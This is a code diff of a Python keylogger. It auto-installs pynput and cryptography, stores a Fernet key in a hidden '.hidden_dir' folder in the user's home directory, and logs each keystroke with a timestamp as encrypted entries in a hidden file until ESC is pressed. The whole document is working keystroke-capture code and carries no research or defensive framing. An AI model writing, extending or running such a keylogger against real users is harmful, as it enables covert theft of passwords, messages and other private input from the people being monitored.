@@ -1,63 +1,66 @@
 import os
 import subprocess
+from datetime import datetime
 
-# Check if pynput is installed
 try:
     import pynput
 except ImportError:
     print("pynput is not installed. Installing...")
-    
-    # Install pynput using pip
     subprocess.check_call(['pip', 'install', 'pynput'])
 
-# Check if cryptography is installed
 try:
     from cryptography.fernet import Fernet
 except ImportError:
     print("cryptography is not installed. Installing...")
-    
-    # Install cryptography using pip
     subprocess.check_call(['pip', 'install', 'cryptography'])
     from cryptography.fernet import Fernet
 
-# Generate a key for encryption
-key = Fernet.generate_key()
+from pynput.keyboard import Key, Listener
 
-# Store the generated key in a file for future use
 hidden_dir = os.path.join(os.path.expanduser("~"), ".hidden_dir")
 os.makedirs(hidden_dir, exist_ok=True)
 
-encryption_key_file = os.path.join(hidden_dir, "encryption_key.txt")
-with open(encryption_key_file, "wb") as f:
-    f.write(key)
+key_file_path = os.path.join(hidden_dir, "encryption_key.txt")
+log_file_path = os.path.join(hidden_dir, "keylog_encrypted.txt")
 
+def load_or_create_key():
+    if os.path.exists(key_file_path):
+        with open(key_file_path, "rb") as f:
+            return f.read()
+    key = Fernet.generate_key()
+    with open(key_file_path, "wb") as f:
+        f.write(key)
+    return key
+
+key = load_or_create_key()
 cipher = Fernet(key)
 
-def encrypt_message(message):
+def encrypt_message(message: str) -> bytes:
     return cipher.encrypt(message.encode())
 
-def decrypt_message(token):
-    return cipher.decrypt(token).decode()
+def format_key(key):
+    if hasattr(key, 'char') and key.char:
+        return key.char
+    return f"[{key.name}]"
 
-from pynput.keyboard import Key, Listener
-
-# Function to handle key presses
 def on_press(key):
     try:
-        # Encrypt the pressed key and write to the log file
-        with open(os.path.join(hidden_dir, "keylog_encrypted.txt"), "ab") as f:
-            encrypted_key = encrypt_message(str(key))
-            f.write(encrypted_key)
-            f.write(b'\n')  # Add a newline to separate each entry
-    except AttributeError:
-        # Ignore special keys
-        pass
+        key_str = format_key(key)
+        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        entry = f"{timestamp} | {key_str}"
+        encrypted_entry = encrypt_message(entry)
+
+        with open(log_file_path, "ab") as f:
+            f.write(encrypted_entry + b'\n')
+    except Exception as e:
+        print(f"Logging error: {e}")
 
 def on_release(key):
     if key == Key.esc:
-        # Stop listener
+        print("Stopping keylogger...")
         return False
 
-# Start listening for key presses
+print("Keylogger started... Press ESC to stop.")
+
 with Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
